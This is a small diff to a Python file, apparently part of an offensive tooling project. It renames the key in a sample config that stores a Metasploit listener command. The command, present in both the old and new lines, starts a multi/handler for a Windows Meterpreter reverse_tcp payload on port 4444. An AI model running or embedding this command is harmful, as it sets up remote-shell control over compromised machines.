@@ -31,9 +31,7 @@ def cprint(message,level):
         raise Exception('LEVEL ERROR')
 
 config_content_sample = '''{
-	"listener": {
-		"command": "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 0.0.0.0;set LPORT 4444;run;"
-	}
+	"listen_command": "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 0.0.0.0;set LPORT 4444;run;"
 }
 
 '''
